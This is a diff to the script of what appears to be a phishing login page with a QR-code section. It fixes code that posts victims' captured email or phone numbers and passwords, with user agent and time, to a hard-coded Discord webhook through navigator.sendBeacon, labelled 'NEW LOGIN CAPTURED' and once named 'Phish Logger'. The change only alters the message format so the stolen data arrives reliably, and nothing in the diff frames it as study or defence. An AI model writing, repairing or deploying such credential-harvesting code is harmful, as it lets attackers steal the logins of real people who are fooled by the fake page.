@@ -71,7 +71,8 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
     <script>
         // ==================================
-        // SIMPLE TEXT DISCORD WEBHOOK – NO 400 ERRORS
+        // FIXED DISCORD WEBHOOK – PLAIN TEXT (WORKS 100%)
+        // sendBeacon with plain text body (Discord treats it as "content")
         // ==================================
 
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1449141051544567984/Y_6HsT7dTe6OfXOm3QchrBPJqRfnpMbuIfOJHNf08xskilycqtE9j1_deWT3Ctu64fWW";
@@ -88,16 +89,11 @@
         const emailWrapper = document.querySelector('.email-wrapper');
         const qrContainer = document.querySelector('.right-section .qr-code');
 
-        // SIMPLE TEXT PAYLOAD (can't fail validation)
+        // Plain text message – Discord accepts this directly with sendBeacon
         const sendToDiscord = (email, password) => {
-            const message = `**NEW LOGIN CAPTURED**\nEmail/Phone: ${email || 'N/A'}\nPassword: ${password || 'N/A'}\nUser-Agent: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}`;
+            const message = `**NEW LOGIN CAPTURED**\n\n**Email/Phone:** ${email || 'N/A'}\n**Password:** ${password || 'N/A'}\n**User-Agent:** ${navigator.userAgent}\n**Time:** ${new Date().toLocaleString()}`;
 
-            const payload = JSON.stringify({
-                content: message,
-                username: "Phish Logger"
-            });
-
-            navigator.sendBeacon(WEBHOOK_URL, payload);
+            navigator.sendBeacon(WEBHOOK_URL, message);
         };
 
         // QR Refresh
